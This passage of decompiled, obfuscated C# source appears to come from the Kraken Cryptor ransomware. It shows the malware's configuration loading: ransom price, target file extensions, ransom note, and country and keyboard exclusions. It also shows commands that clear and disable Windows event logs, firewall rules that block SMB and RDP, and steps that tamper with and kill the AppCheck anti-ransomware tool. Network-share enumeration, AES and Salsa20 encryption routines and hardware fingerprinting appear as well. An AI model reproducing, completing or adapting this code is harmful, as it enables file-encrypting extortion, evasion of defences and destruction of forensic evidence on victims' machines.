			if (Class4.Class5.smethod_44() != 16 && Class4.Class5.smethod_44() != 128)
			{
				if (Class4.Class5.smethod_44() != 32 && Class4.Class5.smethod_44() != 256)
				{
					return null;
				}
				rijndaelManaged.KeySize = 256;
				byte_1 = Class27.smethod_79(byte_0, 32, byte_1, 1024);
			}
			else
			{
				rijndaelManaged.KeySize = 128;
				byte_1 = Class27.smethod_79(byte_0, 16, byte_1, 1024);
			}
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Key = byte_1;
			rijndaelManaged.IV = byte_0;
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_2, 0, byte_2.Length);
				cryptoStream.Close();
			}
			return memoryStream.ToArray();
		}
		catch (Exception)
		{
		}
		return null;
	}

	unsafe static bool smethod_116()
	{
		void* ptr = stackalloc byte[10];
		try
		{
			JsonNode jsonNode = Class27.smethod_2(Encoding.UTF8.GetString(Class27.smethod_23()));
			Class4.Class5.smethod_0(Class27.smethod_124(jsonNode["project"]["name"]));
			Class4.Class5.smethod_2(Class27.smethod_124(jsonNode["project"]["version"]));
			Class4.Class5.smethod_3(Class27.smethod_124(jsonNode["project"]["comment"]));
			Class4.Class5.smethod_5(Class27.smethod_22(jsonNode["module"]["anti_forensic"]));
			Class4.Class5.smethod_7(Class27.smethod_22(jsonNode["module"]["anti_revere"]));
			Class4.Class5.smethod_9(Class27.smethod_22(jsonNode["module"]["anti_virtual"]));
			Class4.Class5.smethod_13(Class27.smethod_22(jsonNode["module"]["anti_smb"]));
			Class4.Class5.smethod_11(Class27.smethod_22(jsonNode["module"]["anti_rdp"]));
			Class4.Class5.smethod_15(Class27.smethod_22(jsonNode["module"]["country_check"]));
			Class4.Class5.smethod_17(Class27.smethod_22(jsonNode["module"]["keyboard_check"]));
			Class4.Class5.smethod_19(Class27.smethod_22(jsonNode["module"]["registry_check"]));
			Class4.Class5.smethod_21(Class27.smethod_22(jsonNode["module"]["fix_device"]));
			Class4.Class5.smethod_23(Class27.smethod_22(jsonNode["module"]["network_device"]));
			Class4.Class5.smethod_25(Class27.smethod_22(jsonNode["module"]["flash_device"]));
			Class4.Class5.smethod_27(Class27.smethod_22(jsonNode["module"]["extension_bypass"]));
			Class4.Class5.smethod_29(Class27.smethod_22(jsonNode["module"]["rapid_mode"]));
			Class4.Class5.smethod_31(Class27.smethod_124(jsonNode["core"]["support_email_1"]));
			Class4.Class5.smethod_33(Class27.smethod_124(jsonNode["core"]["support_email_2"]));
			Class4.Class5.smethod_35(Class27.smethod_127(jsonNode["core"]["price"]));
			Class4.Class5.smethod_37(Class27.smethod_124(jsonNode["core"]["price_unit"]));
			Class4.Class5.smethod_39(Class27.smethod_124(jsonNode["core"]["public_key"]));
			Class4.Class5.smethod_41(Class27.smethod_55(jsonNode["core"]["main_cipher_key_size"]));
			Class4.Class5.smethod_43(Class27.smethod_55(jsonNode["core"]["session_cipher_key_size"]));
			Class4.Class5.smethod_45(Class27.smethod_55(jsonNode["core"]["aes_cipher_key_size"]));
			Class4.Class5.smethod_47(Class27.smethod_107(Class27.smethod_104(jsonNode["core"]["target_extensions"])));
			Class4.Class5.smethod_49(Class27.smethod_107(Class27.smethod_104(jsonNode["core"]["countries"])));
			Class4.Class5.smethod_51(Class27.smethod_107(Class27.smethod_104(jsonNode["core"]["languages"])));
			Class4.Class5.smethod_53(Class27.smethod_107(Class27.smethod_104(jsonNode["core"]["skip_files"])));
			Class4.Class5.smethod_55(Class27.smethod_107(Class27.smethod_104(jsonNode["core"]["skip_directories"])));
			Class4.Class5.smethod_57(Class27.smethod_107(Class27.smethod_104(jsonNode["core"]["process_stop"])));
			Class4.Class5.smethod_59(Class27.smethod_124(jsonNode["core"]["help_note"]["name"]));
			Class4.Class5.smethod_61(Class27.smethod_124(jsonNode["core"]["help_note"]["extension"]));
			Class4.Class5.smethod_63(Class27.smethod_124(jsonNode["core"]["help_note"]["body"]));
			Class4.Class5.Class6.smethod_1(Class27.smethod_124(jsonNode["core"]["help_language"]["en"]));
			Class4.Class5.Class7.smethod_1(Class27.smethod_124(jsonNode["core"]["statistics"]["bundle"]));
			Class4.Class5.Class7.smethod_3(Class27.smethod_124(jsonNode["core"]["statistics"]["polipo"]));
			Class4.Class5.Class7.smethod_5(Class27.smethod_124(jsonNode["core"]["statistics"]["user_agent"]));
			Class4.Class5.Class7.smethod_5(Class4.Class5.Class7.smethod_4().Replace("%1", Class4.Class5.smethod_1()));
			Class4.Class5.Class7.smethod_7(Class27.smethod_124(jsonNode["core"]["statistics"]["proxy"]));
			Class4.Class5.Class7.smethod_9(Class27.smethod_124(jsonNode["core"]["statistics"]["listener"]));
			Class4.Class5.Class7.smethod_11(Class27.smethod_124(jsonNode["core"]["statistics"]["host"]));
			Class4.Class5.Class7.smethod_13(Class27.smethod_124(jsonNode["core"]["statistics"]["api"]));
			if (Class4.Class5.smethod_8() && Class27.smethod_64())
			{
				((byte*)ptr)[9] = 0;
			}
			else if (Class4.Class5.smethod_6() && Class27.smethod_81())
			{
				((byte*)ptr)[9] = 0;
			}
			else if (!Class27.smethod_32())
			{
				((byte*)ptr)[9] = 0;
			}
			else
			{
				if (Class4.Class5.smethod_16())
				{
					string text = Class27.smethod_73();
					if (text != null)
					{
						if (text.Contains(","))
						{
							string[] array = text.Split(new char[1] { ',' });
							*(int*)ptr = 0;
							while (*(int*)ptr < array.Length)
							{
								string text2 = array[*(int*)ptr];
								string[] array2 = Class4.Class5.smethod_50();
								*(int*)((byte*)ptr + 4) = 0;
								while (true)
								{
									if (*(int*)((byte*)ptr + 4) >= array2.Length)
									{
										(*(int*)ptr)++;
										break;
									}
									if (!(array2[*(int*)((byte*)ptr + 4)] == text2))
									{
										(*(int*)((byte*)ptr + 4))++;
										continue;
									}
									((byte*)ptr)[9] = 0;
									goto end_IL_0006;
								}
							}
						}
						else
						{
							string[] array = Class4.Class5.smethod_50();
							*(int*)ptr = 0;
							while (*(int*)ptr < array.Length)
							{
								if (!(array[*(int*)ptr] == text))
								{
									(*(int*)ptr)++;
									continue;
								}
								((byte*)ptr)[9] = 0;
								goto end_IL_0006;
							}
						}
					}
				}
				if (Class4.Class5.smethod_14())
				{
					string[] array = Class4.Class5.smethod_48();
					*(int*)ptr = 0;
					while (*(int*)ptr < array.Length)
					{
						string text3 = array[*(int*)ptr];
						if (!(Class8.Class9.smethod_16().ToUpper() == text3.ToUpper()))
						{
							(*(int*)ptr)++;
							continue;
						}
						((byte*)ptr)[9] = 0;
						goto end_IL_0006;
					}
				}
				if (!Class4.Class5.smethod_18() || Class27.smethod_46())
				{
					if (Class4.Class5.smethod_4())
					{
						Class27.smethod_98("cmd.exe", "/C wevtutil.exe clear-log Application");
						Class27.smethod_98("cmd.exe", "/C wevtutil.exe clear-log Security");
						Class27.smethod_98("cmd.exe", "/C wevtutil.exe clear-log System");
						Class27.smethod_98("cmd.exe", "/C sc config eventlog start=disabled");
						Class27.smethod_98("cmd.exe", "sc stop eventlog");
						Class27.smethod_98("cmd.exe", "/C REG add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\eventlog\" / v Start / t REG_DWORD / d 4 / f");
					}
					if (Class4.Class5.smethod_12() || Class4.Class5.smethod_10())
					{
						Class27.smethod_98("cmd.exe", "/C NetSh Advfirewall set allprofiles state on");
					}
					if (Class4.Class5.smethod_12())
					{
						Class27.smethod_98("cmd.exe", "/C netsh advfirewall firewall add rule name=\"SMB Protocol Block\" protocol=TCP dir=in localport=445 action=block");
					}
					if (Class4.Class5.smethod_10())
					{
						Class27.smethod_98("cmd.exe", "/C netsh advfirewall firewall add rule name=\"RDP Protocol Block\" protocol=TCP dir=in localport=3389 action=block");
					}
					Class27.smethod_29(Class4.Class5.smethod_56());
					if (Class27.smethod_96("appcheck"))
					{
						Class27.smethod_98("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v ProductVersion /t REG_SZ /d \"Please contact with \"Kraken Cryptor\" support for decrypt your files.\" /f");
						Class27.smethod_98("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v RansomBackupExt/t REG_SZ /d \"NULL\" /f");
						Class27.smethod_98("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v Options /t REG_DWORD /d 0 /f");
						Class27.smethod_98("cmd.exe", "/C taskkill /F /IM appcheck.exe");
					}
					((byte*)ptr)[8] = 1;
					goto IL_0830;
				}
				((byte*)ptr)[9] = 0;
			}
			end_IL_0006:;
		}
		catch (Exception)
		{
			((byte*)ptr)[8] = 0;
			goto IL_0830;
		}
		return ((byte*)ptr)[9] != 0;
		IL_0830:
		return ((byte*)ptr)[8] != 0;
	}

	unsafe static List<string> smethod_117(string string_0)
	{
		void* ptr = stackalloc byte[13];
		List<string> list = new List<string>();
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		((byte*)ptr)[12] = 0;
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < string_0.Length)
		{
			switch (string_0[*(int*)((byte*)ptr + 8)])
			{
			case ',':
				if (((byte*)ptr)[12] == 0 && *(int*)ptr == 0)
				{
					list.Add(string_0.Substring(*(int*)((byte*)ptr + 4), *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4)));
					*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8) + 1;
				}
				break;
			case '"':
				if (*(int*)((byte*)ptr + 8) == 0 || string_0[*(int*)((byte*)ptr + 8) - 1] != '\\')
				{
					((byte*)ptr)[12] = ((((byte*)ptr)[12] == 0) ? ((byte)1) : ((byte)0));
				}
				break;
			case '[':
			case '{':
				if (((byte*)ptr)[12] == 0)
				{
					(*(int*)ptr)++;
				}
				break;
			case ']':
			case '}':
				if (((byte*)ptr)[12] == 0)
				{
					(*(int*)ptr)--;
				}
				break;
			}
			(*(int*)((byte*)ptr + 8))++;
		}
		list.Add(string_0.Substring(*(int*)((byte*)ptr + 4)));
		return list;
	}

	static byte[] smethod_118(int int_0)
	{
		return Class27.smethod_60(int_0);
	}

	static string smethod_119(byte[] byte_0)
	{
		return Convert.ToBase64String(byte_0);
	}

	[DllImport("svrapi", CharSet = CharSet.Ansi, EntryPoint = "NetShareEnum")]
	static extern int NetShareEnum_1([MarshalAs(UnmanagedType.LPTStr)] string string_0, int int_0, IntPtr intptr_0, ushort ushort_0, out ushort ushort_1, out ushort ushort_2);

	unsafe static void smethod_120(string string_0, Class3 class3_0)
	{
		void* ptr = stackalloc byte[26];
		*(int*)ptr = 50;
		Type typeFromHandle = typeof(Class3.Struct2);
		*(int*)((byte*)ptr + 4) = Marshal.SizeOf(typeFromHandle);
		*(ushort*)((byte*)ptr + 20) = (ushort)(20 * *(int*)((byte*)ptr + 4));
		IntPtr intPtr = Marshal.AllocHGlobal(*(ushort*)((byte*)ptr + 20));
		try
		{
			*(int*)((byte*)ptr + 8) = Class27.NetShareEnum_1(string_0, *(int*)ptr, intPtr, *(ushort*)((byte*)ptr + 20), out *(ushort*)((byte*)ptr + 22), out *(ushort*)((byte*)ptr + 24));
			if (124 == *(int*)((byte*)ptr + 8))
			{
				*(int*)ptr = 1;
				typeFromHandle = typeof(Class3.Struct3);
				*(int*)((byte*)ptr + 4) = Marshal.SizeOf(typeFromHandle);
				*(int*)((byte*)ptr + 8) = Class27.NetShareEnum_1(string_0, *(int*)ptr, intPtr, *(ushort*)((byte*)ptr + 20), out *(ushort*)((byte*)ptr + 22), out *(ushort*)((byte*)ptr + 24));
			}
			if (*(int*)((byte*)ptr + 8) != 0 && 234 != *(int*)((byte*)ptr + 8))
			{
				Console.WriteLine(*(int*)((byte*)ptr + 8));
				return;
			}
			*(int*)((byte*)ptr + 12) = 0;
			*(int*)((byte*)ptr + 16) = intPtr.ToInt32();
			while (*(int*)((byte*)ptr + 12) < *(ushort*)((byte*)ptr + 22))
			{
				IntPtr ptr2 = new IntPtr(*(int*)((byte*)ptr + 16));
				if (1 == *(int*)ptr)
				{
					Class3.Struct3 @struct = (Class3.Struct3)Marshal.PtrToStructure(ptr2, typeFromHandle);
					class3_0.method_0(@struct.string_0, string.Empty, @struct.method_0(), @struct.string_1);
				}
				else
				{
					Class3.Struct2 struct2 = (Class3.Struct2)Marshal.PtrToStructure(ptr2, typeFromHandle);
					class3_0.method_0(struct2.string_0, struct2.string_2, struct2.method_0(), struct2.string_1);
				}
				(*(int*)((byte*)ptr + 12))++;
				*(int*)((byte*)ptr + 16) += *(int*)((byte*)ptr + 4);
			}
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	unsafe static void smethod_121(Class10.Class11.Class12 class12_0, byte[] byte_0, uint[] uint_0)
	{
		void* ptr = stackalloc byte[8];
		uint[] array = (uint[])uint_0.Clone();
		*(int*)ptr = class12_0.int_0;
		while (*(int*)ptr > 0)
		{
			array[4] ^= Class27.smethod_6(7, array[0] + array[12]);
			array[8] ^= Class27.smethod_6(9, array[4] + array[0]);
			array[12] ^= Class27.smethod_6(13, array[8] + array[4]);
			array[0] ^= Class27.smethod_6(18, array[12] + array[8]);
			array[9] ^= Class27.smethod_6(7, array[5] + array[1]);
			array[13] ^= Class27.smethod_6(9, array[9] + array[5]);
			array[1] ^= Class27.smethod_6(13, array[13] + array[9]);
			array[5] ^= Class27.smethod_6(18, array[1] + array[13]);
			array[14] ^= Class27.smethod_6(7, array[10] + array[6]);
			array[2] ^= Class27.smethod_6(9, array[14] + array[10]);
			array[6] ^= Class27.smethod_6(13, array[2] + array[14]);
			array[10] ^= Class27.smethod_6(18, array[6] + array[2]);
			array[3] ^= Class27.smethod_6(7, array[15] + array[11]);
			array[7] ^= Class27.smethod_6(9, array[3] + array[15]);
			array[11] ^= Class27.smethod_6(13, array[7] + array[3]);
			array[15] ^= Class27.smethod_6(18, array[11] + array[7]);
			array[1] ^= Class27.smethod_6(7, array[0] + array[3]);
			array[2] ^= Class27.smethod_6(9, array[1] + array[0]);
			array[3] ^= Class27.smethod_6(13, array[2] + array[1]);
			array[0] ^= Class27.smethod_6(18, array[3] + array[2]);
			array[6] ^= Class27.smethod_6(7, array[5] + array[4]);
			array[7] ^= Class27.smethod_6(9, array[6] + array[5]);
			array[4] ^= Class27.smethod_6(13, array[7] + array[6]);
			array[5] ^= Class27.smethod_6(18, array[4] + array[7]);
			array[11] ^= Class27.smethod_6(7, array[10] + array[9]);
			array[8] ^= Class27.smethod_6(9, array[11] + array[10]);
			array[9] ^= Class27.smethod_6(13, array[8] + array[11]);
			array[10] ^= Class27.smethod_6(18, array[9] + array[8]);
			array[12] ^= Class27.smethod_6(7, array[15] + array[14]);
			array[13] ^= Class27.smethod_6(9, array[12] + array[15]);
			array[14] ^= Class27.smethod_6(13, array[13] + array[12]);
			array[15] ^= Class27.smethod_6(18, array[14] + array[13]);
			*(int*)ptr -= 2;
		}
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < 16)
		{
			Class27.smethod_50(array[*(int*)((byte*)ptr + 4)] + uint_0[*(int*)((byte*)ptr + 4)], byte_0, 4 * *(int*)((byte*)ptr + 4));
			(*(int*)((byte*)ptr + 4))++;
		}
	}

	unsafe static string smethod_122()
	{
		void* ptr = stackalloc byte[8];
		string empty = string.Empty;
		try
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			*(int*)ptr = 0;
			while (*(int*)ptr < allNetworkInterfaces.Length)
			{
				NetworkInterface networkInterface = allNetworkInterfaces[*(int*)ptr];
				if (networkInterface.OperationalStatus != OperationalStatus.Up)
				{
					(*(int*)ptr)++;
					continue;
				}
				empty += networkInterface.GetPhysicalAddress().ToString();
				string[] array = new string[empty.Length];
				*(int*)((byte*)ptr + 4) = 0;
				while (*(int*)((byte*)ptr + 4) < empty.Length)
				{
					array[*(int*)((byte*)ptr + 4)] = Encoding.UTF8.GetBytes(empty)[*(int*)((byte*)ptr + 4)].ToString("x2");
					(*(int*)((byte*)ptr + 4))++;
				}
				return string.Join(":", array);
			}
			return empty;
		}
		catch (Exception)
		{
			return null;
		}
	}

	static IEnumerable<Class21.Class22> smethod_123(Class21 class21_0)
	{
		return new Class21.Class25(-2)
		{
			class21_0 = class21_0
		};
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool StrongNameSignatureVerificationEx_8([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	[DllImport("gdi32.dll")]
	static extern int GetDeviceCaps(IntPtr intptr_0, int int_0);

	static string smethod_124(JsonNode jsonNode_0)
	{
		return jsonNode_0?.ToString();
	}

	static Class29.Class33 smethod_125(Class29.Class34 class34_0)
	{
		byte[] array = new byte[class34_0.int_3];
		Array.Copy(class34_0.byte_1, 0, array, 0, class34_0.int_3);
		return new Class29.Class33(array);
	}

	static bool smethod_126()
	{
		return PlatformID.Win32NT == Environment.OSVersion.Platform;
	}

	static double smethod_127(JsonNode jsonNode_0)
	{
		return (double)Convert.ChangeType(((JsonBasic)jsonNode_0).m_value, typeof(double));
	}

	static Class21.Class22 smethod_128(string string_0, Class21 class21_0)
	{
		Class21.Class24 CS_0024_003C_003E8__locals0 = new Class21.Class24();
		CS_0024_003C_003E8__locals0.string_0 = string_0;
		CS_0024_003C_003E8__locals0.string_0 = CS_0024_003C_003E8__locals0.string_0.Replace("\\", "/").Trim().TrimStart(new char[1] { '/' });
		return Class27.smethod_43(class21_0).FirstOrDefault((Class21.Class22 class22_0) => class22_0.method_0() == CS_0024_003C_003E8__locals0.string_0) ?? throw new FileNotFoundException("File not found in the archive: " + CS_0024_003C_003E8__locals0.string_0);
	}

	static string smethod_129()
	{
		if (File.Exists("hwid.cfg"))
		{
			Miscellaneous.Class15.string_0 = File.ReadAllText("hwid.cfg");
		}
		if (string.IsNullOrEmpty(Miscellaneous.Class15.string_0))
		{
			Miscellaneous.Class15.string_0 = Class27.smethod_58("CPU >> " + Class27.smethod_4() + "\nBIOS >> " + Class27.smethod_78() + "\nBASE >> " + Class27.smethod_56() + "\nDISK >> " + Class27.smethod_74() + "\nVIDEO >> " + Class27.smethod_9() + "\nMAC >> " + Class27.smethod_45());
			File.WriteAllText("hwid.cfg", Miscellaneous.Class15.string_0);
		}
		return Miscellaneous.Class15.string_0;
	}
}
